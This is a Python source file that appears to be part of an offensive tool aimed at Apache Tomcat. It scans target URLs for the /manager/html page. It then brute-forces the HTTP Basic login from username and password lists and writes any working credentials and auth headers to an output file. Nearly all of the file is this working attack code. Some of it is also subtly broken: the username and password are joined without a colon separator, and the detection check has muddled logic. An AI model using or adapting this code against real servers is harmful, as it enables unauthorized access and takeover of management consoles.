from requests import get

from urllib3 import disable_warnings
disable_warnings()

from rich import print
from base64 import b64encode

from src.core.manager import *


def connect() -> str:
    """Try to connect to the target
    """

    for url in get_urls():
        path: str = f"{url}/manager/html"

        try:
            response        = get(path, **props)
            body: str       = response.text
            status_code:str = response.status_code

            detect = lambda success = 401 or 200: status_code == success and 'Tomcat' or 'tomcat' in body
            (bruteforce(path)) if detect() else print(f"[red][ERR] Connection problems with {url} | {status_code}")

        except Exception as e:
            return print(f"[red][!] - An error happened: {e} [/]")


def bruteforce(path) -> str:
    """Bruteforce the Apache Tomcat manager login generating a cookie
    """

    print(f"[cyan][INF] Tomcat detected in {path} starting bruteforce...")

    for u, p in zip(get_usernames(), get_passwords()):

        auth_string: str  = u+p
        auth_string: str  = auth_string.encode('utf-8')
        auth_string: str  = b64encode(auth_string)
        auth_string: str  = f'Basic {auth_string}'

        chars: str  = "b'"
        auth_string: str  = auth_string.replace(chars, "")
        auth_string: str  = auth_string.replace("'", "")

        auth_header: str  = { 'Authorization': auth_string, 'User-Agent': user_agent() }

        response          = get(path, verify=False, headers=auth_header)
        status_code: str  = response.status_code

        if(status_code == 200):
            print(f"[green][INF] Login: {u+p} | URL: {path} | Cookie: {auth_string} \n")

            with open("src/core/result/out.txt", "a+") as file:
                file.write(f"{path} | {u+p} | {auth_string}")

        else:
            pass

    print(f"[cyan][INF] Bruteforce on {path} is done.\n")